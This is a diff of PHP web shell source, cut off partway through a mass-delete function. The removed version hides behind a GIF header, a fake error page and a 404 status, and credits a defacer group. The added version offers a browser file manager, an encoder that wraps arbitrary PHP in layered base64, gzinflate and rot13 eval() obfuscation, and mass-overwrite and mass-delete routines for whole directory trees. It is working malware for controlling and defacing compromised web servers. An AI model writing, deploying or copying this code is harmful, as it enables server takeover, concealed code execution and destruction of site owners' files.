@@ -1,1265 +1,1580 @@
-GIF89; 
-<?php 
-
-<!DOCTYPE html>
 <html>
 <head>
-    <title>Eror Page</title>
-    <meta name="author" content="IDEFACER.COM">
-    <meta name="viewport" content="Error Page" />
-    <meta name="description" content="Error Page">
-    <meta property="og:description" content="Error Page">
-    <meta property="og:image" content="#">
-    <meta name="robots" content="noindex">
-    <meta name="googlebot" content="noindex">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" href="https://media.tenor.com/nlXsoxHvGvsAAAAj/vampire-lana-del-rey.gif" sizes="32x32">
+<title>2024</title>
 </head>
-<link href="" rel="stylesheet" type="text/css">
-<body bgcolor="#571010" text="#ffffff">
-<style>
-    @import url('https://fonts.googleapis.com/css?family=Dosis');
-    @import url('https://fonts.googleapis.com/css?family=Bungee');
+<style type="text/css">
+@import url('https://fonts.googleapis.com/css?family=Ubuntu+Mono&display=swap');
 body {
-    font-family: "Dosis", cursive;
-    text-shadow:0px 0px 1px #571010;
-}
-
-body::-webkit-scrollbar {
-  width: 12px;
-}
-
-body::-webkit-scrollbar-track {
-  background: #571010;
-}
-
-body::-webkit-scrollbar-thumb {
-  background-color: #000;
-  border: 3px solid gray;
-}
-
-#content tr:hover {
-    background-color: #571010;
-    text-shadow:0px 0px 10px #fff;
-}
-
-#content .first {
-    background-color: #571010;
-}
-
-#content .first:hover {
-    background-color: #571010;
-    text-shadow:0px 0px 1px #571010;
+  font-family: 'Ubuntu Mono', monospace;
+  color: #8a8a8a;
+  background:rgba(222,222,222,0.73);
 }
 
 table {
-    border: 2px #571010 dotted;
-    table-layout: fixed;
-    word-break: break-all;
-}
-input { 
-	margin-bottom: 4px; 
-	background: rgba(0,0,0,0.3);
-	border: none;
-	outline: none;
-	padding: 5px;
-	font-size: 15px;
-	color: #fff;
-	text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
-	border: 1px solid rgba(0,0,0,0.3);
-	border-radius: 14px;
-	box-shadow: inset 0 -5px 45px rgba(100,100,100,0.2), 0 1px 1px rgba(255,255,255,0.2);
-	-webkit-transition: box-shadow .5s ease;
-	-moz-transition: box-shadow .5s ease;
-	-o-transition: box-shadow .5s ease;
-	-ms-transition: box-shadow .5s ease;
-	transition: box-shadow .5s ease;
+  background:#fff;
+  line-height: 40px;
+  border-collapse: separate;
+  border-spacing: 0;
+  border: 25px solid #fff;
+  width: 70%;
+  margin: 50px auto;
+  border-radius: 20px;
+  box-shadow: 0px 0px 0px 6px rgba(222,222,222,0.73);
 }
 
+thead tr:first-child {
+  background: #fff;
+  color: #8a8a8a;
+  border: none;
+}
+
+th:first-child,
+td:first-child {
+  padding: 0 15px 0 20px;
+}
+
+th {
+  font-weight: 500;
+}
+
+thead tr:last-child th {
+  border-bottom: none;
+}
+
+tr.hover:hover {
+  background-color: #dedede;
+  cursor: default;
+}
+tbody tr:last-child td {
+  border: none;
+}
+
+
+tbody td {
+  border-bottom:none;
+}
+
+td:last-child {
+  padding-right: 10px;
+}
 textarea {
-    max-width: 100%;
-    max-height: 100%;
-    resize: none;
-    outline: none;
-    overflow: auto;
-	color: #fff;
-	text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
-	border: 1px solid rgba(0,0,0,0.3);
-	border-radius: 4px;
-	box-shadow: inset 0 -5px 45px rgba(100,100,100,0.2), 0 1px 1px rgba(255,255,255,0.2);
-	-webkit-transition: box-shadow .5s ease;
-	-moz-transition: box-shadow .5s ease;
-	-o-transition: box-shadow .5s ease;
-	-ms-transition: box-shadow .5s ease;
-	transition: box-shadow .5s ease;
-	background: rgba(0,0,0,0.3);
+  font-family: 'Ubuntu Mono', monospace;
+  background:rgba(222,222,222,0.73);
+  border:1px solid rgba(222,222,222,0.73);
+  margin-left:-8px;
+  margin-right:10px;
+  margin-top:10px;
+  margin-bottom:-2px;
+  width:96%;
+  resize:none;
+  border-radius:20px;
+  height:400px;
+  color:#8a8a8a;
+  padding: 12px 20px;
+  -moz-border-bottom-colors: none;
+  -moz-border-left-colors: none;
+  -moz-border-right-colors: none;
+  -moz-border-top-colors: none;
+  outline:none;
+}
+  ::-webkit-scrollbar {
+  width: 0px;
+  height: 0px;
+}
+  ::-webkit-scrollbar-button:start:decrement,
+  ::-webkit-scrollbar-button:end:increment  {
+  height: 0px;
+  background-color: transparent;
+}
+  ::-webkit-scrollbar-track-piece  {
+  background-color: #eeeeee;
+}
+  ::-webkit-scrollbar-thumb:vertical {
+  height: 0px;
+  background-color: #666;
+  border: 0px solid #eee;
+  -webkit-border-radius: 16px;
 }
 
-textarea::-webkit-scrollbar {
-  width: 12px;
+input[type=submit] {
+  font-family: 'Ubuntu Mono', monospace;
+  padding:7px 20px;
+  outline:none;
+  margin-left:-8px;
+  margin-right:10px;
+  margin-top:10px;
+  margin-bottom:10px;
+  color:#8a8a8a;
+  font-weight: bold;
+  border-radius:20px;
+  border:1px solid rgba(222,222,222,0.73);
+  background:rgba(222,222,222,0.73);
 }
-
-textarea::-webkit-scrollbar-track {
-  background: #000000;
+input[type=text] {
+  font-family: 'Ubuntu Mono', monospace;
+  padding:7px 5px;
+  outline:none;
+  margin-left:-8px;
+  margin-right:10px;
+  margin-top:10px;
+  margin-bottom:10px;
+  color:#8a8a8a;
+  border-bottom:3px solid rgba(222,222,222,0.73);
+  border-top:none;
+  border-left:none;
+  border-right:none;
 }
-
-textarea::-webkit-scrollbar-thumb {
-  background-color: #fff;
-  border: 3px solid black;
-}
-
-a {
-    color: #ffffff;
-    text-decoration: none;
-}
-
-a:hover {
-    color: #757B89;
-    text-shadow:0px 0px 10px #4A7BEC;
-}
-
-input,select,textarea {
-    border: 1px #000000 solid;
-    -moz-border-radius: 5px;
-    -webkit-border-radius:5px;
-    border-radius:5px;
-}
-
-.gas {
-    background-color: #571010;
-    color: #ffffff;
-    cursor: pointer;
-}
-
 select {
-    background-color: transparent;
-    color: #ffffff;
+  font-family: 'Ubuntu Mono', monospace;
+  padding:7px 5px;
+  outline:none;
+  margin-left:-8px;
+  margin-right:10px;
+  margin-top:10px;
+  margin-bottom:10px;
+  color:#8a8a8a;
+  border-bottom:3px solid rgba(222,222,222,0.73);
+  border-top:none;
+  border-left:none;
+  border-right:none;
 }
-
-select:after {
-    cursor: pointer;
+a {
+  color: #8a8a8a;
+  text-decoration:none;
 }
-
-.linka {
-    background-color: transparent;
-    color: #ffffff;
+a:hover {
+  text-decoration: underline;
+  -webkit-text-decoration-color: red;
+  text-decoration-color: red;
 }
-
-.up {
-    background-color: transparent;
-    color: #fff;
+.alert {
+  text-align: center;
+  width: 100%;
+  margin-top:10px;
+  margin-left:-10px;
+  margin-bottom:10px;
+  border: 1px solid transparent;
+  border-radius: 20px;
 }
-
-option {
-    background-color: #1f1f1f;
+.alert-success {
+  background-color: #91cf91;
+  border-color: #80c780;
+  color: #3d8b3d;
 }
-
-::-webkit-file-upload-button {
-  background: transparent;
-  color: #fff;
-  border-color: #fff;
+.alert-danger {
+  background-color: #e27c79;
+  border-color: #dd6864;
+  color: #9f2723;
+}
+textarea:focus,
+th.line {
+  border:1px solid #dedede;
+}
+.icon {
+  width:25px;
+  height:25px;
+  margin-bottom:-6px;
+  margin-left:-8px;
+}
+textarea:hover,  
+a.tools:hover, 
+a.back:hover,
+select:hover, 
+input[type=submit]:hover {
+    cursor:pointer;
+    border:1px solid red;
+    text-decoration:none;
+}
+select:focus,
+input:focus {
+  background:rgba(222,222,222,0.73);
+  border-left:none;
+  border-right:none;
+  border-top:none;
+  border-bottom: 3px solid red;
+}
+select:hover, 
+input[type=text]:hover {
+  border-left:none;
+  border-right:none;
+  border-top:none;
+  border-bottom:3px solid red;
+}
+table.back {
+  background:none;
+  border:none;
+}
+tr.back {
+  background:none;
+  border:none;
+}
+a.back {
+  font-family: 'Ubuntu Mono', monospace;
+  color:#8a8a8a;
+  border-radius:20px;
+  border:1px solid rgba(222,222,222,0.73);
+  background:rgba(222,222,222,0.73);
+  padding:5px 30px;
+  outline:none;
+  width:100%;
+}
+td.act {
+  width:28px;
+  background:#fff;
+  border:1px solid #fff;
+}
+td.img {
+  width:10px;
+}
+.container {
+  display: block;
+  position: relative;
   cursor: pointer;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
 }
-.button {
-background-color: ;
-border: 5px solid #571010;
-color: #fff;
-line-height: 20px;
+a.tools {
+  font-family: 'Ubuntu Mono', monospace;
+  margin-left:-8px;
+  margin-right:10px;
+  margin-top:10px;
+  margin-bottom:10px;
+  padding:7px 20px;
+  outline:none;
+  color:#8a8a8a;
+  border-radius:20px;
+  border:1px solid rgba(222,222,222,0.73);
+  background:rgba(222,222,222,0.73);
+}
+@media screen 
+  and (min-device-width: 1500px) 
+  and (max-device-width: 1600px) 
+  and (-webkit-min-device-pixel-ratio: 1) { 
+}
 
-}.button:hover {
-background-color: #fff;
-border-color: #59b1eb;
-color: #59b1eb;
+/* ----------- Retina Screens ----------- */
+@media screen 
+  and (min-device-width: 1500px) 
+  and (max-device-width: 1600px) 
+  and (-webkit-min-device-pixel-ratio: 2)
+  and (min-resolution: 192dpi) { 
 }
-body, a, a:link{cursor:url(http://4.bp.blogspot.com/-hAF7tPUnmEE/TwGR3lRH0EI/AAAAAAAAAs8/6pki22hc3NE/s1600/ass.png), 
-	default;
-} 
-	a:hover {
-	cursor:url(http://3.bp.blogspot.com/-bRikgqeZx0Q/TwGR4MUEC7I/AAAAAAAAAtA/isJmS0r35Qw/s1600/pointer.png),
-	wait;
+/* Smartphones (portrait and landscape) ----------- */
+@media only screen 
+and (min-device-width : 320px) 
+and (max-device-width : 480px) {
+/* Styles */
 }
 
+/* Smartphones (landscape) ----------- */
+@media only screen 
+and (min-width : 321px) {
+/* Styles */
+}
+
+/* Smartphones (portrait) ----------- */
+@media only screen 
+and (max-width : 320px) {
+/* Styles */
+}
+
+/* iPads (portrait and landscape) ----------- */
+@media only screen 
+and (min-device-width : 768px) 
+and (max-device-width : 1024px) {
+/* Styles */
+}
+
+/* iPads (landscape) ----------- */
+@media only screen 
+and (min-device-width : 768px) 
+and (max-device-width : 1024px) 
+and (orientation : landscape) {
+/* Styles */
+}
+
+/* iPads (portrait) ----------- */
+@media only screen 
+and (min-device-width : 768px) 
+and (max-device-width : 1024px) 
+and (orientation : portrait) {
+/* Styles */
+}
+
+/* Desktops and laptops ----------- */
+@media only screen 
+and (min-width : 1224px) {
+/* Styles */
+}
+
+/* Large screens ----------- */
+@media only screen 
+and (min-width : 1824px) {
+/* Styles */
+}
+
+/* iPhone 4 ----------- */
+@media
+only screen and (-webkit-min-device-pixel-ratio : 1.5),
+only screen and (min-device-pixel-ratio : 1.5) {
+/* Styles */
+}
+input[type=checkbox]:not(old),
+input[type=radio   ]:not(old){
+  width     : 2em;
+  margin    : 0;
+  padding   : 0;
+  font-size : 1em;
+  opacity   : 0;
+}
+input[type=checkbox]:not(old) + label,
+input[type=radio   ]:not(old) + label{
+  display      : inline-block;
+  margin-left  : -2em;
+  line-height  : 1.5em;
+}
+input[type=checkbox]:not(old) + label > span,
+input[type=radio   ]:not(old) + label > span{
+  display          : inline-block;
+  width            : 0.875em;
+  height           : 0.875em;
+  margin           : 0.25em 0.5em 0.25em 0.25em;
+  border           : 0.0625em solid rgb(192,192,192);
+  border-radius    : 0.25em;
+  background       : rgb(224,224,224);
+  background-image :    -moz-linear-gradient(rgb(240,240,240),rgb(224,224,224));
+  background-image :     -ms-linear-gradient(rgb(240,240,240),rgb(224,224,224));
+  background-image :      -o-linear-gradient(rgb(240,240,240),rgb(224,224,224));
+  background-image : -webkit-linear-gradient(rgb(240,240,240),rgb(224,224,224));
+  background-image :         linear-gradient(rgb(240,240,240),rgb(224,224,224));
+  vertical-align   : bottom;
+}
+input[type=checkbox]:not(old):checked + label > span,
+input[type=radio   ]:not(old):checked + label > span{
+  background-image :    -moz-linear-gradient(rgb(224,224,224),rgb(240,240,240));
+  background-image :     -ms-linear-gradient(rgb(224,224,224),rgb(240,240,240));
+  background-image :      -o-linear-gradient(rgb(224,224,224),rgb(240,240,240));
+  background-image : -webkit-linear-gradient(rgb(224,224,224),rgb(240,240,240));
+  background-image :         linear-gradient(rgb(224,224,224),rgb(240,240,240));
+}
+input[type=checkbox]:not(old):checked + label > span:before{
+  content     : '✓';
+  display     : block;
+  width       : 1em;
+  color       : rgb(153,204,102);
+  font-size   : 0.875em;
+  line-height : 1em;
+  text-align  : center;
+  text-shadow : 0 0 0.0714em rgb(115,153,77);
+  font-weight : bold;
+}
+
+input[type=radio]:not(old):checked + label > span > span{
+  display          : block;
+  width            : 0.5em;
+  height           : 0.5em;
+  margin           : 0.125em;
+  border           : 0.0625em solid rgb(115,153,77);
+  border-radius    : 0.125em;
+  background       : rgb(153,204,102);
+  background-image :    -moz-linear-gradient(rgb(179,217,140),rgb(153,204,102));
+  background-image :     -ms-linear-gradient(rgb(179,217,140),rgb(153,204,102));
+  background-image :      -o-linear-gradient(rgb(179,217,140),rgb(153,204,102));
+  background-image : -webkit-linear-gradient(rgb(179,217,140),rgb(153,204,102));
+  background-image :         linear-gradient(rgb(179,217,140),rgb(153,204,102));
+}
 </style>
-<script>
-function setfilename(val)
-  {
-    filename = val.split('\\').pop().split('/').pop();
-    //filename = filename.substring(0, filename.lastIndexOf('.'));
-    document.getElementById('namanya').value = filename;
-  }
+<body>
+<script type="text/javascript">
+! function (e, t) {
+  "object" == typeof exports && "object" == typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define("darkmode-js", [], t) : "object" == typeof exports ? exports["darkmode-js"] = t() : e["darkmode-js"] = t()
+}("undefined" != typeof self ? self : this, function () {
+  return function (e) {
+    var t = {};
 
-async function loadFile(file) {
-    let text = await file.text();
-    document.getElementById("bepasdata").innerHTML = text;
-}
+    function n(o) {
+      if (t[o]) return t[o].exports;
+      var r = t[o] = {
+        i: o,
+        l: !1,
+        exports: {}
+      };
+      return e[o].call(r.exports, r, r.exports, n), r.l = !0, r.exports
+    }
+    return n.m = e, n.c = t, n.d = function (e, t, o) {
+      n.o(e, t) || Object.defineProperty(e, t, {
+        enumerable: !0,
+        get: o
+      })
+    }, n.r = function (e) {
+      "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
+        value: "Module"
+      }), Object.defineProperty(e, "__esModule", {
+        value: !0
+      })
+    }, n.t = function (e, t) {
+      if (1 & t && (e = n(e)), 8 & t) return e;
+      if (4 & t && "object" == typeof e && e && e.__esModule) return e;
+      var o = Object.create(null);
+      if (n.r(o), Object.defineProperty(o, "default", {
+        enumerable: !0,
+        value: e
+      }), 2 & t && "string" != typeof e)
+        for (var r in e) n.d(o, r, function (t) {
+          return e[t]
+        }.bind(null, r));
+      return o
+    }, n.n = function (e) {
+      var t = e && e.__esModule ? function () {
+        return e.default
+      } : function () {
+        return e
+      };
+      return n.d(t, "a", t), t
+    }, n.o = function (e, t) {
+      return Object.prototype.hasOwnProperty.call(e, t)
+    }, n.p = "", n(n.s = 0)
+  }([
+    function (e, t, n) {
+      "use strict";
+      Object.defineProperty(t, "__esModule", {
+        value: !0
+      }), t.default = void 0;
+      var o, r = (o = n(1)) && o.__esModule ? o : {
+        default: o
+      };
+      var a = r.default;
+      t.default = a,
+      function (e) {
+        e.Darkmode = r.default
+      }(window), e.exports = t.default
+    },
+    function (e, t, n) {
+      "use strict";
+
+      function o(e, t) {
+        for (var n = 0; n < t.length; n++) {
+          var o = t[n];
+          o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, o.key, o)
+        }
+      }
+      Object.defineProperty(t, "__esModule", {
+        value: !0
+      }), t.default = void 0;
+      var r = function () {
+        function e(t) {
+          ! function (e, t) {
+            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
+          }(this, e);
+          var n = t && t.bottom ? t.bottom : "32px",
+            o = t && t.right ? t.right : "32px",
+            r = t && t.left ? t.left : "unset",
+            a = t && t.time ? t.time : "0.3s",
+            d = t && t.mixColor ? t.mixColor : "#fff",
+            i = t && t.backgroundColor ? t.backgroundColor : "#fff",
+            s = t && t.buttonColorDark ? t.buttonColorDark : "#100f2c",
+            l = t && t.buttonColorLight ? t.buttonColorLight : "#fff",
+            c = t && t.label ? t.label : "",
+            u = !t || !1 !== t.saveInCookies,
+            f = "\n      .darkmode-layer {\n        position: fixed;\n        pointer-events: none;\n        background: ".concat(d, ";\n        transition: all ").concat(a, " ease;\n        mix-blend-mode: difference;\n      }\n\n      .darkmode-layer--button {\n        width: 2.9rem;\n        height: 2.9rem;\n        border-radius: 50%;\n        right: ").concat(o, ";\n        bottom: ").concat(n, ";\n        left: ").concat(r, ";\n      }\n\n      .darkmode-layer--simple {\n        width: 100%;\n        height: 100%;\n        top: 0;\n        left: 0;\n        transform: scale(1) !important;\n      }\n      \n      .darkmode-layer--expanded {\n        transform: scale(100);\n        border-radius: 0;\n      }\n\n      .darkmode-layer--no-transition {\n        transition: none;\n      }\n      \n      .darkmode-toggle {\n        background: ").concat(s, ";\n        width: 3rem;\n        height: 3rem;\n        position: fixed;\n        border-radius: 50%;\n        right: ").concat(o, ";\n        bottom: ").concat(n, ";\n        left: ").concat(r, ";\n        cursor: pointer;\n        transition: all 0.5s ease;\n        display: flex;\n        justify-content: center;\n        align-items: center;\n      }\n      \n      .darkmode-toggle--white {\n        background: ").concat(l, ";\n      }\n\n      .darkmode-background {\n        background: ").concat(i, ";\n        position: fixed;\n        pointer-events: none;\n        z-index: -10;\n        width: 100%;\n        height: 100%;\n        top: 0;\n        left: 0;\n      }\n      \n      img, .darkmode-ignore {\n        isolation: isolate;\n        display: inline-block;\n      }\n    "),
+            m = document.createElement("div"),
+            y = document.createElement("div"),
+            b = document.createElement("div");
+          y.innerHTML = c, m.classList.add("darkmode-layer"), b.classList.add("darkmode-background"), !0 === ("true" === window.localStorage.getItem("darkmode")) && u && (m.classList.add("darkmode-layer--expanded", "darkmode-layer--simple", "darkmode-layer--no-transition"), y.classList.add("darkmode-toggle--white"), document.body.classList.add("darkmode--activated")), document.body.insertBefore(y, document.body.firstChild), document.body.insertBefore(m, document.body.firstChild), document.body.insertBefore(b, document.body.firstChild), this.addStyle(f), this.button = y, this.layer = m, this.saveInCookies = u, this.time = a
+        }
+        var t, n, r;
+        return t = e, (n = [{
+          key: "addStyle",
+          value: function (e) {
+            var t = document.createElement("link");
+            t.setAttribute("rel", "stylesheet"), t.setAttribute("type", "text/css"), t.setAttribute("href", "data:text/css;charset=UTF-8," + encodeURIComponent(e)), document.head.appendChild(t)
+          }
+        }, {
+          key: "showWidget",
+          value: function () {
+            var e = this,
+              t = this.button,
+              n = this.layer,
+              o = 1e3 * parseFloat(this.time);
+            t.classList.add("darkmode-toggle"), n.classList.add("darkmode-layer--button"), t.addEventListener("click", function () {
+              var r = e.isActivated();
+              r ? (n.classList.remove("darkmode-layer--simple"), setTimeout(function () {
+                n.classList.remove("darkmode-layer--no-transition"), n.classList.remove("darkmode-layer--expanded")
+              }, 1)) : (n.classList.add("darkmode-layer--expanded"), setTimeout(function () {
+                n.classList.add("darkmode-layer--no-transition"), n.classList.add("darkmode-layer--simple")
+              }, o)), t.classList.toggle("darkmode-toggle--white"), document.body.classList.toggle("darkmode--activated"), window.localStorage.setItem("darkmode", !r)
+            })
+          }
+        }, {
+          key: "toggle",
+          value: function () {
+            var e = this.layer,
+              t = this.isActivated();
+            e.classList.toggle("darkmode-layer--simple"), document.body.classList.toggle("darkmode--activated"), window.localStorage.setItem("darkmode", !t)
+          }
+        }, {
+          key: "isActivated",
+          value: function () {
+            return document.body.classList.contains("darkmode--activated")
+          }
+        }]) && o(t.prototype, n), r && o(t, r), e
+      }();
+      t.default = r, e.exports = t.default
+    }
+  ])
+});
 </script>
-<center>
-<font face="Hemi Head Rg-BoldItalic" size="8">IDEFACER.COM</font></center><br>&nbsp;
-<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">	
-<tr><td>
+<script>
+  new Darkmode().showWidget();
+</script>
+<table>
 <?php
-@set_time_limit(0);
-@error_reporting(0);
-@http_response_code(404);
-
-$disfunc = @ini_get("disable_functions");
-if (empty($disfunc)) {
-    $disf = "<font color='gold'>NONE</font>";
-} else {
-    $disf = "<font color='red'>".$disfunc."</font>";
-}
-
-function author() {
-    exit();
-}
-
-function cekdir() {
+function cwd()
+{
     if (isset($_GET['path'])) {
-        $lokasi = $_GET['path'];
+        $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, $_GET['path']);
+        @chdir($cwd);
     } else {
-        $lokasi = getcwd();
+        $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, @getcwd());
     }
-    if (is_writable($lokasi)) {
-        return "<font color='green'>Writeable</font>";
-    } else {
-        return "<font color='red'>Writeable</font>";
-    }
+    return $cwd;
 }
-
-function cekroot() {
-    if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
-        return "<font color='green'>Writeable</font>";
-    } else {
-        return "<font color='red'>Writeable</font>";
-    }
-}
-
-function xrmdir($dir) {
-    $items = scandir($dir);
-    foreach ($items as $item) {
-        if ($item === '.' || $item === '..') {
-            continue;
+function pwd()
+{
+    $dir = @explode(DIRECTORY_SEPARATOR, @cwd());
+    foreach ($dir as $key => $pwd) {
+        print "<a href='?path=";
+        for ($i = 0; $i <= $key; $i++) {
+            print $dir[$i];
+            if ($i != $key) {
+                print DIRECTORY_SEPARATOR;
+            }
         }
-        $path = $dir.'/'.$item;
-        if (is_dir($path)) {
-            xrmdir($path);
+        print "'>" . $pwd . "</a>/";
+    }
+}
+function perms($filename)
+{
+    $perms = fileperms($filename);
+
+    switch ($perms & 0xf000) {
+        case 0xc000: // socket
+            $info = 's';
+            break;
+        case 0xa000: // symbolic link
+            $info = 'l';
+            break;
+        case 0x8000: // regular
+            $info = 'r';
+            break;
+        case 0x6000: // block special
+            $info = 'b';
+            break;
+        case 0x4000: // directory
+            $info = 'd';
+            break;
+        case 0x2000: // character special
+            $info = 'c';
+            break;
+        case 0x1000: // FIFO pipe
+            $info = 'p';
+            break;
+        default:
+            // unknown
+            $info = 'u';
+    }
+
+    // Owner
+    $info .= $perms & 0x0100 ? 'r' : '-';
+    $info .= $perms & 0x0080 ? 'w' : '-';
+    $info .=
+        $perms & 0x0040
+            ? ($perms & 0x0800
+                ? 's'
+                : 'x')
+            : ($perms & 0x0800
+                ? 'S'
+                : '-');
+
+    // Group
+    $info .= $perms & 0x0020 ? 'r' : '-';
+    $info .= $perms & 0x0010 ? 'w' : '-';
+    $info .=
+        $perms & 0x0008
+            ? ($perms & 0x0400
+                ? 's'
+                : 'x')
+            : ($perms & 0x0400
+                ? 'S'
+                : '-');
+
+    // World
+    $info .= $perms & 0x0004 ? 'r' : '-';
+    $info .= $perms & 0x0002 ? 'w' : '-';
+    $info .=
+        $perms & 0x0001
+            ? ($perms & 0x0200
+                ? 't'
+                : 'x')
+            : ($perms & 0x0200
+                ? 'T'
+                : '-');
+
+    return $info;
+}
+function permission($filename, $perms)
+{
+    if (
+        is_writable($filename)
+    ) { ?> <font color="green"><?php print $perms; ?></font> <?php } else { ?> <font color="red"><?php print $perms; ?></font> <?php }
+}
+function size($file)
+{
+    $bytes = @filesize($file);
+    if ($bytes >= 1073741824) {
+        return @number_format($bytes / 1073741824, 2) . ' GB';
+    } elseif ($bytes >= 1048576) {
+        return @number_format($bytes / 1048576, 2) . ' MB';
+    } elseif ($bytes >= 1024) {
+        return @number_format($bytes / 1024, 2) . ' KB';
+    } elseif ($bytes > 1) {
+        return $bytes . ' bytes';
+    } elseif ($bytes == 1) {
+        return '1 byte';
+    } else {
+        return '0 bytes';
+    }
+}
+function success($text)
+{
+    ?>
+  <center>
+  <div class="alert alert-success" role="alert">
+    <?php print $text; ?>
+  </div>
+  </center>
+  <?php
+}
+function failed($text)
+{
+    ?>
+  <center>
+  <div class="alert alert-danger" role="alert">
+    <?php print $text; ?>
+  </div>
+  </center>
+  <?php
+}
+function makefile($filename, $text)
+{
+    $fp = @fopen($filename, "w");
+    @fwrite($fp, $text);
+    @fclose($fp);
+}
+function makedir($filename)
+{
+    return @mkdir($filename);
+}
+if (isset($_GET['encode'])) { ?>
+    <thead>
+      <tr>
+        <th colspan="2">
+          <a class="back" href="?path=<?php print @cwd(); ?>">ENCODE</a>
+        </th>
+      </tr>
+    </thead>
+    <form method="post">
+    <tr>
+      <td colspan="2">
+        <textarea name="text"></textarea>
+      </td>
+    </tr>
+    <tr>
+      <td>
+        <select name="mode" style="width:100%;">
+          <option value="urlencode">url</option>
+          <option value="base64">Base64</option>
+          <option value="ur">base64 - convert_uu</option>
+          <option value="gzinflates">gzinflate - base64</option>
+          <option value="str2">str_rot13 - base64</option>
+          <option value="gzinflate">str_rot13 - gzinflate - base64</option>
+          <option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
+          <option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
+        </select>
+      </td>
+      <td>
+        <input style="width:100%;" type="submit" name="submit" value="ENCODE">
+      </td>
+    </tr>
+    </form>
+    <?php
+    if (isset($_POST['submit'])) {
+        encode($_POST['text'], $_POST['mode']);
+    }
+    exit();
+    }
+function encode($text, $mode)
+{
+    switch ($mode) {
+        case 'base64':
+            $codi = base64_encode($text);
+            $codi = "<?php eval('?>'.base64_decode('$codi'));";
+            break;
+        case 'str':
+            $codi = base64_encode(str_rot13(gzdeflate(str_rot13($text))));
+            $codi = "<?php eval('?>'.str_rot13(gzinflate(str_rot13(base64_decode('$codi')))));";
+            break;
+        case 'gzinflate':
+            $codi = base64_encode(gzdeflate(str_rot13($text)));
+            $codi = "<?php eval('?>'.str_rot13(gzinflate(base64_decode('$codi'))));";
+            break;
+        case 'gzinflates':
+            $codi = base64_encode(gzdeflate($text));
+            $codi = "<?php eval('?>'.gzinflate(base64_decode('$codi')));";
+            break;
+        case 'str2':
+            $codi = base64_encode(str_rot13($text));
+            $codi = "<?php eval('?>'.str_rot13(base64_decode('$codi')));";
+            break;
+        case 'urlencode':
+            $codi = rawurlencode($text);
+            $codi = "<?php eval('?>'.rawurldecode('$codi'));";
+            break;
+        case 'ur':
+            $codi = base64_encode(convert_uuencode($text));
+            $codi = "<?php eval('?>'.convert_uudecode(base64_decode('$codi')));";
+            break;
+        case 'url':
+            $codi = base64_encode(
+                gzdeflate(
+                    convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))
+                )
+            );
+            $codi = "<?php eval('?>'.base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode('$codi')))))));";
+            break;
+    } ?>
+  <tr>
+    <td colspan="2">
+      <textarea readonly><?= $codi ?></textarea>
+    </td>
+  </tr>
+  <?php exit();
+}
+function masswriter($post)
+{
+    if ($_GET['do'] == 'masswrite') { ?>
+  <thead>
+      <tr>
+        <th>
+          <a class="back" href="?path=<?php print @cwd(); ?>">REPLACE FILE</a>
+        </th>
+      </tr>
+    </thead>
+  <form method="post">
+    <tr>
+      <td>
+        <div align="center">
+          <input id="option" type="radio" name="mode" value="masswrite" checked="checked">
+          <label for="option"><span><span></span></span>masswrite</label>
+          <input id="option" type="radio" name="mode" value="massdelete">
+          <label for="option"><span><span></span></span>massdelete</label>
+        </div>
+      </td>
+    </tr>
+    <tr>
+      <td>
+        <input style="width:98.9%;" type="text" name="dir" value="<?php print @cwd(); ?>">
+        
+      </td>
+    </tr>
+    <tr>
+      <td>
+        <input style="width:98.9%;" type="text" name="type" placeholder="type ext : php, if you want execute all please empty this">
+      </td>
+    </tr>
+    <tr>
+      <td>
+        <textarea style="width:96.5%;" name="text" placeholder="if you choose mode massdelete please empty this"></textarea>
+      </td>
+    </tr>
+    <tr>
+      <td>
+        <input class="btn btn-primary" style="width:100%" type="submit" name="submit" value="MASS">
+      </td>
+    </tr>
+  </form>
+  <?php
+  if (isset($_POST['submit'])) {
+      if ($_POST['mode'] == 'masswrite') {
+          @masswrite($_POST['dir'], $_POST['type'], $_POST['text']);
+      }
+      if ($_POST['mode'] == 'massdelete') {
+          @massdelete($_POST['dir'], $_POST['type']);
+      }
+  }
+  exit();
+  }
+}
+function masswrite($dir, $type, $text)
+{
+    if (is_writable($dir)) {
+        $getfile = scandir($dir);
+        foreach ($getfile as $file) {
+            $path = $dir . DIRECTORY_SEPARATOR . $file;
+            if ($file === '.' || filetype($path) == 'file') {
+                if (
+                    @preg_match("/" . $type . "$" . "/", $file, $matches) !=
+                        0 &&
+                    @preg_match(
+                        "/" . $file . "$/",
+                        $_SERVER['PHP_SELF'],
+                        $matches
+                    ) != 1
+                ): ?>
+                    <tr>
+                        <td>
+                            <div class="alert alert-success">
+                                <?= $dir .
+                                    DIRECTORY_SEPARATOR ?><b><?= $file ?> Rewrite Successfully !</b>
+                            </div>
+                        </td>
+                    </tr>
+                    <?php file_put_contents($path, $text);endif;
+            } elseif ($file === '..' || filetype($path) == 'file') {
+                if (
+                    @preg_match("/" . $type . "$" . "/", $file, $matches) !=
+                        0 &&
+                    @preg_match(
+                        "/" . $file . "$/",
+                        $_SERVER['PHP_SELF'],
+                        $matches
+                    ) != 1
+                ): ?>
+                    <tr>
+                        <td>
+                            <div class="alert alert-success">
+                                <?= $dir .
+                                    DIRECTORY_SEPARATOR ?><b><?= $file ?> Rewrite Successfully !</b>
+                            </div>
+                        </td>
+                    </tr>
+                    <?php file_put_contents($path, $text);endif;
+            } else {
+                if (is_dir($path)) {
+                    if (is_writable($path)) {
+                        @file_put_contents($path, $text);
+                        masswrite($path, $type, $text);
+                    }
+                }
+            }
+        }
+    }
+}
+function massdelete($dir, $type)
+{
+    if (is_writable($dir)) {
+        $getfile = scandir($dir);
+        foreach ($getfile as $file) {
